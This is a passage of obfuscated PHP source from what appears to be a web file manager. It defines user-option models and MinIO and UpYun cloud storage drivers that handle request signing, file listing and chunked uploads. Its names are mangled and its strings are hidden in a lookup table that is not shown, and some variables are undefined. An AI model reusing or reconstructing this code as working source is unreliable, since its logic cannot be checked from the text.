Model($şÅñÕòË[2451])->where($ß·°†ŒÆ)->select(); $Ûå¾ˆÌ­ = array_to_keyvalue_group($Ûå¾ˆÌ­, $şÅñÕòË[1757]); foreach ($Ûå¾ˆÌ­ as &$õ¢³‚£) { $£¶µ¸¬Ú = array(); foreach ($õ¢³‚£ as $ìÖäæ) { if (!in_array($ìÖäæ[$şÅñÕòË[107]], $Ş¤²®µí)) { $£¶µ¸¬Ú[$ìÖäæ[$şÅñÕòË[107]]] = $ìÖäæ[$şÅñÕòË[434]]; } } $õ¢³‚£ = $£¶µ¸¬Ú; } unset($õ¢³‚£); $ŞØÉÍ§¬ = Model($şÅñÕòË[2474]); foreach ($Ÿƒ›“û¨ as &$µ£ıèœÜ) { $€Æ˜ìøâ = array(); if (isset($Ûå¾ˆÌ­[$µ£ıèœÜ[$şÅñÕòË[1757]]])) { $€Æ˜ìøâ = $Ûå¾ˆÌ­[$µ£ıèœÜ[$şÅñÕòË[1757]]]; } $µ£ıèœÜ[$şÅñÕòË[2475]] = array(); if (isset($€Æ˜ìøâ[$éÑšÈÌ])) { $µ£ıèœÜ[$şÅñÕòË[2475]] = $ŞØÉÍ§¬->getUserJobInfo($€Æ˜ìøâ[$éÑšÈÌ]); } } unset($µ£ıèœÜ); } protected function groupUserAll($«ÈÇÕ‚¶) { $²ìöİÀ› =& $_SERVER[Ñ¯©ç]; if (!$«ÈÇÕ‚¶) { return !1; } $îè›òÑş = Model($²ìöİÀ›[2046])->field($²ìöİÀ›[1757])->where(array($²ìöİÀ›[1955] => array($²ìöİÀ›[7], $«ÈÇÕ‚¶)))->select(); $îè›òÑş = array_to_keyvalue($îè›òÑş, $²ìöİÀ›[12], $²ìöİÀ›[1757]); return array_unique($îè›òÑş); } public function userSearch($õÜõñ¢ü, $’Ë¢÷Á = "\x2a") { return Model($_SERVER[Ñ¯©ç][582])->where($õÜõñ¢ü)->field($’Ë¢÷Á)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¿Ì¡¡Ñ£) { $ÖıåÃÊ =& $_SERVER[Ñ¯©ç]; $¢ø‚  = defined($ÖıåÃÊ[2178]) && USER_ID ? USER_ID : $ÖıåÃÊ[12]; return "\x55\x73\x65\x72\x4f\x70\x74\x69\x6f\156\x5f{$¿Ì¡¡Ñ£}\137" . $¢ø‚ ; } protected function filterWhere($¾“ë©±) { $ÌŒİ“ =& $_SERVER[Ñ¯©ç]; $¾“ë©±[$ÌŒİ“[1757]] = defined($ÌŒİ“[2178]) && USER_ID ? USER_ID : $ÌŒİ“[12]; return $¾“ë©±; } public function cacheRemoveUser($©„ÇßÅ±, $šøáßÛÖ) { return Cache::remove("\x55\163\145\x72\117\160\164\151\x6f\156\137{$©„ÇßÅ±}\x5f" . $šøáßÛÖ); } protected function optionDefault($ìŠ³˜™æ = '') { $ˆ³¸€ò· =& $_SERVER[Ñ¯©ç]; if ($ìŠ³˜™æ == $ˆ³¸€ò·[12]) { return $GLOBALS[$ˆ³¸€ò·[6]][$ˆ³¸€ò·[2476]]; } if ($ìŠ³˜™æ == $ˆ³¸€ò·[2477]) { return $GLOBALS[$ˆ³¸€ò·[6]][$ˆ³¸€ò·[2478]]; } } } goto BìÔïøƒ”Ô; A¹·£Ç¬Î˜: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ñœ¦Û¦º) { $õÌ†¦ =& $_SERVER[Ñ¯©ç]; parent::__construct($ñœ¦Û¦º); $this->setSignVersion($õÌ†¦[248]); if (!$this->region) { $this->region = $õÌ†¦[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $î“á¥òÛ = $this->getBucketRgn(); return $this->region == $î“á¥òÛ ? !0 : !1; } public function uploadFormData($˜¼©¢ò¢, $ÛØ®Ø” = 3600) { $ÓĞ³§±¤ =& $_SERVER[Ñ¯©ç]; $ûÍ¯õĞÜ = $ÓĞ³§±¤[230]; $¿şñùí¢ = $ÓĞ³§±¤[270]; $Ûàˆğì± = $ÓĞ³§±¤[72]; $Ë˜ùúƒ = gmdate($ÓĞ³§±¤[271]); $´­†ÓÉ¬ = gmdate($ÓĞ³§±¤[272]); $–İ€Ù…¶ = $ÓĞ³§±¤[273]; $†„Ñ…¡ = $ÛØ®Ø” . $ÓĞ³§±¤[12]; $ó·Î™Ç = $ÓĞ³§±¤[274]; $”€»½§ú = array($this->accessKey, $´­†ÓÉ¬, $this->region, $Ûàˆğì±, $–İ€Ù…¶); $‘Á­ñØÚ = implode($ÓĞ³§±¤[8], $”€»½§ú); $ªŸ–»‹ª = array($ÓĞ³§±¤[275] => gmdate($ÓĞ³§±¤[276], strtotime($ÓĞ³§±¤[277])), $ÓĞ³§±¤[278] => array(array($ÓĞ³§±¤[279] => $this->bucket), array($ÓĞ³§±¤[280] => $ûÍ¯õĞÜ), array($ÓĞ³§±¤[281], $ÓĞ³§±¤[282], $ÓĞ³§±¤[12]), array($ÓĞ³§±¤[281], $ÓĞ³§±¤[283], $ÓĞ³§±¤[12]), array($ÓĞ³§±¤[281], $ÓĞ³§±¤[284], $ÓĞ³§±¤[12]), array($ÓĞ³§±¤[285] => $ó·Î™Ç), array($ÓĞ³§±¤[286] => $‘Á­ñØÚ), array($ÓĞ³§±¤[287] => $¿şñùí¢), array($ÓĞ³§±¤[288] => $Ë˜ùúƒ), array($ÓĞ³§±¤[289] => $†„Ñ…¡))); $İÕŒßÎÂ = base64_encode(json_encode($ªŸ–»‹ª)); $í¤ÚÇç· = hash_hmac($ÓĞ³§±¤[290], $´­†ÓÉ¬, $ÓĞ³§±¤[291] . $this->secret, !0); $‘áÎÓ–Ï = hash_hmac($ÓĞ³§±¤[290], $this->region, $í¤ÚÇç·, !0); $¥ïë‡ñÏ = hash_hmac($ÓĞ³§±¤[290], $Ûàˆğì±, $‘áÎÓ–Ï, !0); $·İ€Ÿùù = hash_hmac($ÓĞ³§±¤[290], $–İ€Ù…¶, $¥ïë‡ñÏ, !0); $íÇÕÈÚ = hash_hmac($ÓĞ³§±¤[290], $İÕŒßÎÂ, $·İ€Ÿùù); $ú×–Ÿ”ı = array($ÓĞ³§±¤[247] => $ÓĞ³§±¤[12], $ÓĞ³§±¤[292] => $ÓĞ³§±¤[12], $ÓĞ³§±¤[280] => $ûÍ¯õĞÜ, $ÓĞ³§±¤[285] => $ó·Î™Ç, $ÓĞ³§±¤[293] => $İÕŒßÎÂ, $ÓĞ³§±¤[294] => $‘Á­ñØÚ, $ÓĞ³§±¤[295] => $¿şñùí¢, $ÓĞ³§±¤[296] => $Ë˜ùúƒ, $ÓĞ³§±¤[297] => $†„Ñ…¡, $ÓĞ³§±¤[298] => $íÇÕÈÚ, $ÓĞ³§±¤[209] => $this->getHost()); return $ú×–Ÿ”ı; } } define($_SERVER[Ñ¯©ç][299], 1); define($_SERVER[Ñ¯©ç][300], 2); goto F«‚é™®æ; cğ‘Ó³İ¬µ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\57\57\x76\60\56\x61\160\x69\56\x75\160\171\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¡´¡â’Ä) { parent::__construct(); $this->_init($¡´¡â’Ä); } public function _init($²¸Èñ¢Ä) { $ÅëÏ©Ã =& $_SERVER[Ñ¯©ç]; foreach ($²¸Èñ¢Ä as $¾ê¸€¹“ => $”š€Ã„İ) { if (isset($this->{$¾ê¸€¹“})) { $this->{$¾ê¸€¹“} = $”š€Ã„İ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÅëÏ©Ã[1532] . LNG($ÅëÏ©Ã[1436])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¸›À³¼›, $»½ºìÃÎ = "\107\x45\124") { $åí¾ù¹ =& $_SERVER[Ñ¯©ç]; $‹‰òŸï¯ = gmdate($åí¾ù¹[1469]); $˜ØÖòÏÎ = base64_encode(hash_hmac($åí¾ù¹[1533], "{$»½ºìÃÎ}\46{$¸›À³¼›}\x26{$‹‰òŸï¯}", md5("{$this->userpass}"), !0)); $æ†ß‘Ô = array("\x41\165\164\x68\x6f\162\151\x7a\x61\x74\x69\x6f\156\72\x55\120\x59\x55\116\x20{$this->username}\x3a{$˜ØÖòÏÎ}", "\x44\x61\164\x65\x3a{$‹‰òŸï¯}"); return $æ†ß‘Ô; } public function ussRequest($’ù¦Îğ, $Ï“Ãè = "\x47\105\124", $‡ÍíË…Ä = false, $ú‹Â±ÂÍ = false, $¢òóÊĞ” = false) { $÷Ÿ§º =& $_SERVER[Ñ¯©ç]; $’ù¦Îğ = trim($’ù¦Îğ, $÷Ÿ§º[8]); $àÙÌ€Èø = "\x2f{$this->bucket}\57{$’ù¦Îğ}"; $û‚ìœêÒ = $this->ussHeaders($àÙÌ€Èø, $Ï“Ãè); if ($ú‹Â±ÂÍ) { $û‚ìœêÒ = array_merge($û‚ìœêÒ, $ú‹Â±ÂÍ); } $³‘Éëòç = url_request($this->endpoint . $àÙÌ€Èø, $Ï“Ãè, $‡ÍíË…Ä, $û‚ìœêÒ, $¢òóÊĞ”); if (!$³‘Éëòç) { $ñŞß©×½ = LNG($÷Ÿ§º[1534]); $this->writeLog($ñŞß©×½); return array($÷Ÿ§º[1269] => !1, $÷Ÿ§º[1259] => $ñŞß©×½); } if (strtolower($Ï“Ãè) == $÷Ÿ§º[228] || in_array($³‘Éëòç[$÷Ÿ§º[1269]], array($÷Ÿ§º[274], $÷Ÿ§º[1535]))) { $‡ÍíË…Ä = $³‘Éëòç[$÷Ÿ§º[1536]]; } else { $‡ÍíË…Ä = json_decode($³‘Éëòç[$÷Ÿ§º[1259]], !0); if (!$‡ÍíË…Ä) { $‡ÍíË…Ä = $³‘Éëòç[$÷Ÿ§º[1259]]; } else { if (!$³‘Éëòç[$÷Ÿ§º[803]] && isset($‡ÍíË…Ä[$÷Ÿ§º[1537]])) { $‡ÍíË…Ä = $‡ÍíË…Ä[$÷Ÿ§º[1537]]; } } } if (!$³‘Éëòç[$÷Ÿ§º[803]]) { $this->writeLog($this->__errorMessage($‡ÍíË…Ä)); } return array($÷Ÿ§º[1269] => $³‘Éëòç[$÷Ÿ§º[803]], $÷Ÿ§º[1259] => $‡ÍíË…Ä); } private function __errorMessage($¶ƒÚ…Áë) { $ø–Ø˜œì =& $_SERVER[Ñ¯©ç]; if (!$¶ƒÚ…Áë) { return $ø–Ø˜œì[12]; } static $ò§úû²· = null; if (!$ò§úû²·) { $ò§úû²· = I18n::getType(); } if ($ò§úû²· != $ø–Ø˜œì[1479]) { return $¶ƒÚ…Áë; } $Ïø…ø¹Û = array($ø–Ø˜œì[1538] => $ø–Ø˜œì[1539], $ø–Ø˜œì[1540] => $ø–Ø˜œì[1541], $ø–Ø˜œì[1542] => $ø–Ø˜œì[1541], $ø–Ø˜œì[1543] => $ø–Ø˜œì[1544], $ø–Ø˜œì[1545] => $ø–Ø˜œì[1546], $ø–Ø˜œì[1547] => $ø–Ø˜œì[1548], $ø–Ø˜œì[1549] => $ø–Ø˜œì[1550]); return isset($Ïø…ø¹Û[$¶ƒÚ…Áë]) ? $Ïø…ø¹Û[$¶ƒÚ…Áë] : $¶ƒÚ…Áë; } public function mkfile($¢î—‚Ÿ½, $ù «¹Ç© = '', $£‡£Êˆõ = REPEAT_RENAME) { if ($this->setContent($¢î—‚Ÿ½, $ù «¹Ç©)) { return $this->getPathOuter($¢î—‚Ÿ½); } return !1; } public function mkdir($ØŸ±Õ·â, $€°æûßù = REPEAT_SKIP) { $ü×‚ÃŒú =& $_SERVER[Ñ¯©ç]; $Ÿøª‰¤î = trim($ØŸ±Õ·â, $ü×‚ÃŒú[8]); if ($this->_isFolder($Ÿøª‰¤î)) { return $this->getPathOuter($Ÿøª‰¤î); } $–¾®ìëÀ = array($ü×‚ÃŒú[1551]); $æ±ñæ¬Ú = $this->ussRequest($Ÿøª‰¤î, $ü×‚ÃŒú[258], !1, $–¾®ìëÀ); return $æ±ñæ¬Ú[$ü×‚ÃŒú[1269]] ? $this->getPathOuter($Ÿøª‰¤î) : !1; } public function copyFile($úƒÔåÙş, $óÚ›ìµ“) { $É“åîÃñ =& $_SERVER[Ñ¯©ç]; $ªÚ¥—€ = array($É“åîÃñ[1552] . "\x2f{$this->bucket}\x2f{$úƒÔåÙş}", $É“åîÃñ[1553]); $œ¶î×Ÿß = $this->ussRequest($óÚ›ìµ“, $É“åîÃñ[260], !1, $ªÚ¥—€); return $œ¶î×Ÿß[$É“åîÃñ[1269]] ? !0 : $this->getPathOuter($óÚ›ìµ“); } public function moveFile($´ÈİòÛ, $¤Á¬ß²¯) { $ëı¶«ÃÏ =& $_SERVER[Ñ¯©ç]; $’º‰Ùä = array($ëı¶«ÃÏ[1554] . "\x2f{$this->bucket}\57{$´ÈİòÛ}", $ëı¶«ÃÏ[1553]); $½„¹²ÇÊ = $this->ussRequest($¤Á¬ß²¯, $ëı¶«ÃÏ[260], !1, $’º‰Ùä); return $½„¹²ÇÊ[$ëı¶«ÃÏ[1269]] ? !0 : $this->getPathOuter($¤Á¬ß²¯); } public function delFile($ßı´Ì˜) { $¼ÜÂË =& $_SERVER[Ñ¯©ç]; $®Â¯³¾˜ = $this->ussRequest($ßı´Ì˜, $¼ÜÂË[1555]); return $®Â¯³¾˜[$¼ÜÂË[1269]] ? !0 : !1; } public function delFolder($šàá¹Š²) { $ˆìÏ²–Ò =& $_SERVER[Ñ¯©ç]; if (!$this->exist($šàá¹Š²)) { return !0; } $this->listItemCache = !1; $–¢Ù•îù = $é¿ı½Î  = array(); $this->fileList($šàá¹Š², $–¢Ù•îù, $é¿ı½Î , !0); $this->listItemCache = !0; foreach ($é¿ı½Î  as $ŒÄÌêÆ£) { $úúŠàÂ = $this->ussRequest($ŒÄÌêÆ£[$ˆìÏ²–Ò[32]], $ˆìÏ²–Ò[1555]); if (!$úúŠàÂ[$ˆìÏ²–Ò[1269]]) { return !1; } } foreach ($–¢Ù•îù as $‰¨ûÕ£) { $úúŠàÂ = $this->ussRequest($‰¨ûÕ£, $ˆìÏ²–Ò[1555]); if (!$úúŠàÂ[$ˆìÏ²–Ò[1269]]) { return !1; } } $úúŠàÂ = $this->ussRequest($šàá¹Š², $ˆìÏ²–Ò[1555]); return $úúŠàÂ[$ˆìÏ²–Ò[1269]]; } public function rename($Õşù¤§, $ŸãñÇŒ’) { if ($this->isFile($Õşù¤§)) { $ŸãñÇŒ’ = get_path_father($Õşù¤§) . $ŸãñÇŒ’; return $this->moveFile($Õşù¤§, $ŸãñÇŒ’); } return $this->renameObject($Õşù¤§, $ŸãñÇŒ’); } public function fileInfo($×ìÄûÅ, $½“áèĞİ = false, $ÒÊÙø² = array()) { $·›Ï¢»ã =& $_SERVER[Ñ¯©ç]; $ü‡õÏ¼ß = array($·›Ï¢»ã[32] => $this->pathThis($×ìÄûÅ), $·›Ï¢»ã[97] => $this->getPathOuter($·›Ï¢»ã[8] . $×ìÄûÅ), $·›Ï¢»ã[33] => $·›Ï¢»ã[231], $·›Ï¢»ã[89] => isset($ÒÊÙø²[$·›Ï¢»ã[89]]) ? $ÒÊÙø²[$·›Ï¢»ã[89]] : 0, $·›Ï¢»ã[188] => $this->ext($×ìÄûÅ)); if ($½“áèĞİ) { return $ü‡õÏ¼ß; } $ü‡õÏ¼ß[$·›Ï¢»ã[232]] = $ü‡õÏ¼ß[$·›Ï¢»ã[98]] = 0; $ü‡õÏ¼ß[$·›Ï¢»ã[233]] = $ü‡õÏ¼ß[$·›Ï¢»ã[234]] = !0; if (empty($ÒÊÙø²)) { $ÒÊÙø² = $this->objectMeta($×ìÄûÅ); if (!$ÒÊÙø²) { return $ü‡õÏ¼ß; } } $ü‡õÏ¼ß[$·›Ï¢»ã[232]] = intval($ÒÊÙø²[$·›Ï¢»ã[1556]]); $ü‡õÏ¼ß[$·›Ï¢»ã[98]] = intval($ÒÊÙø²[$·›Ï¢»ã[1557]]); $ü‡õÏ¼ß[$·›Ï¢»ã[89]] = $ÒÊÙø²[$·›Ï¢»ã[89]]; return $ü‡õÏ¼ß; } public function folderInfo($€±¦± Ğ, $ÍØºÕŠÙ = false) { $ı·ÄÉ—× =& $_SERVER[Ñ¯©ç]; $ëãí¸™’ = array($ı·ÄÉ—×[32] => $this->pathThis($€±¦± Ğ), $ı·ÄÉ—×[97] => $this->getPathOuter($ı·ÄÉ—×[8] . $€±¦± Ğ), $ı·ÄÉ—×[33] => $ı·ÄÉ—×[88]); if ($ÍØºÕŠÙ) { return $ëãí¸™’; } $ëãí¸™’[$ı·ÄÉ—×[232]] = $ëãí¸™’[$ı·ÄÉ—×[98]] = 0; $ëãí¸™’[$ı·ÄÉ—×[233]] = $ëãí¸™’[$ı·ÄÉ—×[234]] = !0; if (empty($ïÙ‡ã‘‰)) { $ïÙ‡ã‘‰ = $this->objectMeta($€±¦± Ğ); if (!$ïÙ‡ã‘‰) { return $ëãí¸™’; } } $ëãí¸™’[$ı·ÄÉ—×[232]] = intval($ïÙ‡ã‘‰[$ı·ÄÉ—×[1556]]); $ëãí¸™’[$ı·ÄÉ—×[98]] = intval($ïÙ‡ã‘‰[$ı·ÄÉ—×[1557]]); return $ëãí¸™’; } private function listObjs($³òÒïÂÕ, $´œº…Öµ = 0, $õÜÖ¦íÉ = 1000) { $ûß•ÙŸ¥ =& $_SERVER[Ñ¯©ç]; $Ÿ´×ØÄ¡ = array($ûß•ÙŸ¥[1558], $ûß•ÙŸ¥[1559] . $õÜÖ¦íÉ); if ($´œº…Öµ) { $Ÿ´×ØÄ¡[] = $ûß•ÙŸ¥[1560] . $´œº…Öµ; } $€‹ë·¾ó = $this->ussRequest($³òÒïÂÕ, $ûß•ÙŸ¥[262], !1, $Ÿ´×ØÄ¡); return !$€‹ë·¾ó[$ûß•ÙŸ¥[1269]] ? !1 : $€‹ë·¾ó[$ûß•ÙŸ¥[1259]]; } private function fileList($Ü«Ì‹²î, &$‡Ù˜¶Ëµ, &$Š£‘¡, $¼…ªŸğØ = false) { $™òá˜¶ù =& $_SERVER[Ñ¯©ç]; $şÀÃåç = $™òá˜¶ù[12]; $Ôø€ğı = 1000; $ìšë¹Ôü = rtrim($Ü«Ì‹²î, $™òá˜¶ù[8]) . $™òá˜¶ù[8]; while (!0) { check_abort(); $Ì½«ô£ = $this->listObjs($Ü«Ì‹²î, $şÀÃåç, $Ôø€ğı); if (!$Ì½«ô£) { return !1; } $şÀÃåç = isset($Ì½«ô£[$™òá˜¶ù[1561]]) ? $Ì½«ô£[$™òá˜¶ù[1561]] : $™òá˜¶ù[12]; $ñ×À©ì‰ = isset($Ì½«ô£[$™òá˜¶ù[1562]]) ? $Ì½«ô£[$™òá˜¶ù[1562]] : array(); foreach ($ñ×À©ì‰ as $×Ì¹) { $ØºÊ¶•Ã = $×Ì¹[$™òá˜¶ù[33]] == $™òá˜¶ù[88] ? !0 : !1; $œ¬”„¡ = ltrim($ìšë¹Ôü . $×Ì¹[$™òá˜¶ù[32]], $™òá˜¶ù[8]) . ($ØºÊ¶•Ã ? $™òá˜¶ù[8] : $™òá˜¶ù[12]); $»Ú¬ñ™“ = array($™òá˜¶ù[32] => $œ¬”„¡, $™òá˜¶ù[33] => $ØºÊ¶•Ã ? $™òá˜¶ù[88] : $™òá˜¶ù[231], $™òá˜¶ù[89] => $×Ì¹[$™òá˜¶ù[397]], $™òá˜¶ù[1557] => $×Ì¹[$™òá˜¶ù[1563]]); $this->cacheMethodInfoSet($œ¬”„¡, $ØºÊ¶•Ã, $»Ú¬ñ™“); if ($ØºÊ¶•Ã) { $‡Ù˜¶Ëµ[] = $œ¬”„¡; if ($¼…ªŸğØ) { $this->fileList($œ¬”„¡, $‡Ù˜¶Ëµ, $Š£‘¡, $¼…ªŸğØ); } continue; } $Š£‘¡[] = $»Ú¬ñ™“; } if (count($ñ×À©ì‰) < $Ôø€ğı) { break; } } $this->cacheMethodInfoSet($Ü«Ì‹²î, !0); } public function listPath($ë™Òö‘ , $óöÃ§Å = false) { $É¯«ñ =& $_SERVER[Ñ¯©ç]; $ÅËÕÆ—Â = $Ş©‰£ÃÅ = array(); $this->fileList($ë™Òö‘ , $ÅËÕÆ—Â, $Ş©‰£ÃÅ); foreach ($ÅËÕÆ—Â as $¿ªˆº¦¤ => $ª‹ğÉ¼Ş) { $ÅËÕÆ—Â[$¿ªˆº¦¤] = $this->folderInfo($ª‹ğÉ¼Ş, $óöÃ§Å); } foreach ($Ş©‰£ÃÅ as $¿ªˆº¦¤ => $ª‹ğÉ¼Ş) { $Ş©‰£ÃÅ[$¿ªˆº¦¤] = $this->fileInfo($ª‹ğÉ¼Ş[$É¯«ñ[32]], $óöÃ§Å, $ª‹ğÉ¼Ş); } return array($É¯«ñ[95] => $ÅËÕÆ—Â, $É¯«ñ[96] => $Ş©‰£ÃÅ); } public function has($¹Åù¡ƒÚ, $¡Ø¦âßĞ = false, $•÷öÕÀˆ = true) { $‰ƒƒ¡Ï =& $_SERVER[Ñ¯©ç]; $÷¸Ê¤˜à = $‰ƒƒ¡Ï[12]; $ùò‘œ÷„ = 500; $ÑÌ©ôõİ = 0; $¶­šâÒÈ = 0; $¶‡åÏóË = rtrim($¹Åù¡ƒÚ, $‰ƒƒ¡Ï[8]) . $‰ƒƒ¡Ï[8]; while (!0) { check_abort(); $¨”©È‘¯ = $this->listObjs($¹Åù¡ƒÚ, $÷¸Ê¤˜à, $ùò‘œ÷„); if (!$¨”©È‘¯) { return !1; } $÷¸Ê¤˜à = isset($¨”©È‘¯[$‰ƒƒ¡Ï[1561]]) ? $¨”©È‘¯[$‰ƒƒ¡Ï[1561]] : $‰ƒƒ¡Ï[12]; $‚ô¶™»á = isset($¨”©È‘¯[$‰ƒƒ¡Ï[1562]]) ? $¨”©È‘¯[$‰ƒƒ¡Ï[1562]] : array(); if (empty($‚ô¶™»á)) { break; } $©é¦®¤Ô = array_filter($‚ô¶™»á, function ($ıÖ¡¬¯) { $†Ê£©ïÊ =& $_SERVER[Ñ¯©ç]; return $ıÖ¡¬¯[$†Ê£©ïÊ[33]] == $†Ê£©ïÊ[88]; }); $âÔ•Ã‡¢ = count($‚ô¶™»á); $©é¦®¤Ô = count($©é¦®¤Ô); $şÜÒÒïá = $âÔ•Ã‡¢ - $©é¦®¤Ô; if ($¡Ø¦âßĞ) { $¶­šâÒÈ += $©é¦®¤Ô; $ÑÌ©ôõİ += $şÜÒÒïá; if ($âÔ•Ã‡¢ < $ùò‘œ÷„) { break; } continue; } if ($•÷öÕÀˆ) { if ($şÜÒÒïá) { return !0; } } else { if ($©é¦®¤Ô) { return !0; } } if ($âÔ•Ã‡¢ < $ùò‘œ÷„) { break; } } if ($¡Ø¦âßĞ) { return array($‰ƒƒ¡Ï[240] => $ÑÌ©ôõİ, $‰ƒƒ¡Ï[241] => $¶­šâÒÈ); } return !1; } public function listAll($ã±¿ÉÃ) { $ïĞ’·¸İ =& $_SERVER[Ñ¯©ç]; $í–‹ûº‰ = $¢ïõòÌ = array(); $this->fileList($ã±¿ÉÃ, $í–‹ûº‰, $¢ïõòÌ, !0); $„íËœ±’ = array_to_keyvalue($¢ïõòÌ, $ïĞ’·¸İ[32]); foreach ($í–‹ûº‰ as $£ŞÏƒÖ¹) { if (is_string($£ŞÏƒÖ¹)) { $„íËœ±’[$£ŞÏƒÖ¹] = array($ïĞ’·¸İ[89] => 0); } } return $this->listAllFiles($ã±¿ÉÃ, $„íËœ±’); } public function canRead($¹¤—ÊÁ¼) { return $this->exist($¹¤—ÊÁ¼) ? !0 : !1; } public function canWrite($İĞşŠ–ğ) { return $this->exist($İĞşŠ–ğ) ? !0 : !1; } public function getContent($µ×”©ß²) { return $this->fileSubstr($µ×”©ß², 0, -1); } public function setContent($¢ÁÍ±ñº, $‰ÇÙş²± = '') { $è±¸ò† =& $_SERVER[Ñ¯©ç]; if (!$‰ÇÙş²±) { $»Ø’×Éê = $this->ussRequest($¢ÁÍ±ñº, $è±¸ò†[258]); return $»Ø’×Éê[$è±¸ò†[1269]]; } $¤âÅèÖğ = $this->tempFile($this->pathThis($¢ÁÍ±ñº)); file_put_contents($¤âÅèÖğ, $‰ÇÙş²±); if ($this->upload($¢ÁÍ±ñº, $¤âÅèÖğ)) { $this->tempFileRemve($¤âÅèÖğ); return !0; } return !1; } public function fileSubstr($ ©ëÒ, $ºã©ºœ, $°‚¡òšÊ) { $—â÷óûû =& $_SERVER[Ñ¯©ç]; if (!($Ôò¨şƒÎ = $this->link($ ©ëÒ))) { return !1; } $ğ¸£ÌíÃ = !1; if ($°‚¡òšÊ > 0) { $½¦ë„˜¼ = $ºã©ºœ + $°‚¡òšÊ - 1; $ğ¸£ÌíÃ = array($—â÷óûû[1511] . $ºã©ºœ . $—â÷óûû[445] . $½¦ë„˜¼); } $ã…·‡·ì = url_request($Ôò¨şƒÎ, $—â÷óûû[262], !1, $ğ¸£ÌíÃ); return $ã…·‡·ì[$—â÷óûû[803]] ? $ã…·‡·ì[$—â÷óûû[1259]] : !1; } public function upload($ë˜ƒåÛ‹, $í‹ï¦êÑ, $ëÖšœãÔ = false, $ôøÏ™©ã = REPEAT_REPLACE) { $ÌÈ©ğ­Ã =& $_SERVER[Ñ¯©ç]; $«¸–ò¬í = IO::size($í‹ï¦êÑ); if ($«¸–ò¬í <= 1024 * 1024 * 200) { $’ÜêŒòç = array($ÌÈ©ğ­Ã[1564] . $í‹ï¦êÑ); $¡öèæ˜Ì = $this->ussRequest($ë˜ƒåÛ‹, $ÌÈ©ğ­Ã[260], $’ÜêŒòç); return $¡öèæ˜Ì[$ÌÈ©ğ­Ã[1269]] ? $this->getPathOuter($ë˜ƒåÛ‹) : !1; } $úòÍÍ¡¤ = 1024 * 1024 * 10; $ï—Í¸–Œ = array($ÌÈ©ğ­Ã[1565], $ÌÈ©ğ­Ã[1566] . $«¸–ò¬í, $ÌÈ©ğ­Ã[1567], $ÌÈ©ğ­Ã[1568] . $úòÍÍ¡¤); $¡öèæ˜Ì = $this->ussRequest($ë˜ƒåÛ‹, $ÌÈ©ğ­Ã[260], !1, $ï—Í¸–Œ); if (!$¡öèæ˜Ì[$ÌÈ©ğ­Ã[1269]]) { return !1; } $Ø€ºî• = $¡öèæ˜Ì[$ÌÈ©ğ­Ã[1259]]; $åËÉ´í® = 0; $¼ªÊû“å = $Ø€ºî•[$ÌÈ©ğ­Ã[1569]]; $Îïı¡å· = fopen($í‹ï¦êÑ, $ÌÈ©ğ­Ã[1430]); if (!$Îïı¡å·) { return !1; } do { $§ëœ”¹ = $Ø€ºî•[$ÌÈ©ğ­Ã[1570]]; fseek_64($Îïı¡å·, $åËÉ´í®); $«÷¤óŞ‹ = fread($Îïı¡å·, $§ëœ”¹); $¥ˆşç¢œ = 0; do { $¥ˆşç¢œ++; $Ø€ºî• = $this->uploadPart($ë˜ƒåÛ‹, $Ø€ºî•, $«÷¤óŞ‹); } while (!$Ø€ºî• && $¥ˆşç¢œ < 3); if (!$Ø€ºî•) { return !1; } $¼ªÊû“å = $Ø€ºî•[$ÌÈ©ğ­Ã[1569]]; $åËÉ´í® += $§ëœ”¹; } while ($¼ªÊû“å != -1); fclose($Îïı¡å·); $ï—Í¸–Œ = array($ÌÈ©ğ­Ã[1571], $ÌÈ©ğ­Ã[1572] . $Ø€ºî•[$ÌÈ©ğ­Ã[1573]], $ÌÈ©ğ­Ã[1567]); $¡öèæ˜Ì = $this->ussRequest($ë˜ƒåÛ‹, $ÌÈ©ğ­Ã[260], !1, $ï—Í¸–Œ); return $¡öèæ˜Ì[$ÌÈ©ğ­Ã[1269]] ? $this->getPathOuter($Î­ÁÒ™ı) : !1; } private function uploadPart($º˜ØÈ‰Õ, $øèöÁ˜, &$ÉŠ÷´‰À) { $ƒ½Ğæî =& $_SERVER[Ñ¯©ç]; $‹è‡Û€ = array($ƒ½Ğæî[1574], $ƒ½Ğæî[1572] . $øèöÁ˜[$ƒ½Ğæî[1573]], $ƒ½Ğæî[1575] . $øèöÁ˜[$ƒ½Ğæî[1569]], $ƒ½Ğæî[156] . $øèöÁ˜[$ƒ½Ğæî[1570]]); $æ‰¦ãô¤ = $this->ussRequest($º˜ØÈ‰Õ, $ƒ½Ğæî[260], $ÉŠ÷´‰À, $‹è‡Û€); return !$æ‰¦ãô¤[$ƒ½Ğæî[1269]] ? $æ‰¦ãô¤[$ƒ½Ğæî[1269]] : $æ‰¦ãô¤[$ƒ½Ğæî[1259]]; } public function uploadFormData($ËÔúèƒ”, $á€‚ÁÇÒ = 3600) { return $this->uploadPolicy($ËÔúèƒ”, $á€‚ÁÇÒ); } public function multiUploadFormData($ö‹Åîõˆ, $Ùã¾¥İ = 3600) { $ØÇĞÈ•– =& $_SERVER[Ñ¯©ç]; $‘´”©îØ = (int) $GLOBALS[$ØÇĞÈ•–[7]][$ØÇĞÈ•–[89]]; return $this->uploadPolicy($ö‹Åîõˆ, $Ùã¾¥İ, $‘´”©îØ); } private function uploadPolicy($ ä’§, $È™ä¿šø = 3600, $½±ñŠï = 0) { $û†äóÉ‡ =& $_SERVER[Ñ¯©ç]; $áÆğìŸË = $û†äóÉ‡[8] . $this->bucket; $¼·¾ãà = gmdate($û†äóÉ‡[1469]); $£¿½šË = array($û†äóÉ‡[1576] => $this->bucket, $û†äóÉ‡[1577] => $ ä’§, $û†äóÉ‡[1578] => time() + $È™ä¿šø, 